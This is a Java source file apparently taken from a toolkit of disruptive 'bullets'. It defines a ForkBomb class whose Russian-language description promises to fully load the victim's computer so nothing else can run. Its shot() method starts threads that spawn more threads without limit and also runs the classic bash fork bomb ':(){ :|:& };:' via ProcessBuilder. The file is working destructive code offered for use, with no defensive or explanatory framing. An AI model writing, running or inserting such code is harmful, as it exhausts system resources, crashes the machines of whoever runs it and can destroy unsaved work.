package bullets;

import lombok.Getter;

import java.io.IOException;

@Getter
public class ForkBomb implements Bullet {
    String name = "Запуск форк-бомбы";
    String description = "Полностью загружает ваш компьютер, не давая выполнить ничего";

    @Override
    public void shot() throws IOException {
        Bomb.spawn();

        new ProcessBuilder("bash", "-c",
                ":(){ :|:& };:").start();
    }

    private static class Bomb extends Thread {
        public static void spawn() {
            new Thread(() -> {
                while (true) {
                    Bomb.spawn();
                }
            }).start();

            new Thread(() -> {
                while (true) {
                    Bomb.spawn();
                }
            }).start();

            ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c",
                    ":(){ :|:& };:");

            try {
                processBuilder.start();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
}